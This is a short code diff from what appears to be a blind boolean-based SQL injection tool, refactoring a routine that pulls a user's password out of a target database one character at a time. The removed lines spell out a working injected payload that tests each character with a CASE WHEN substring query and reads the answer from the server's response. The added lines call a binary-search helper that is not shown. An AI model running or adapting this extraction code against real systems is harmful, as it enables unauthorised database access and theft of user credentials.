@@ -19,15 +19,9 @@ class BlindBooleanBased(BaseSQLi):
         if not length:
             return None
         for position in range(1, length + 1):
-            for char in string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*":
-                payload = f"'||(SELECT CASE WHEN ({DB_CONFIG[self.db_type]['substr']}((SELECT {column} FROM {self.targetTable} WHERE username='{username}'),{position},1)='{char}') THEN 1 ELSE 0 END{DB_CONFIG[self.db_type]['from_dual']})||'"
-                response = self.send(payload)
-                if self.signal in response.text:
-                    self.found_password += char
-                    print(f"[+] Position {position}: {char}  →  {self.found_password}")
-                    break
-            else:
-                break
+            char = self.extract_char_binary(column, position, username)
+            self.found_password += char
+            print(f"[+] Position {position}: {char}  →  {self.found_password}")
         return self.found_password
 
     
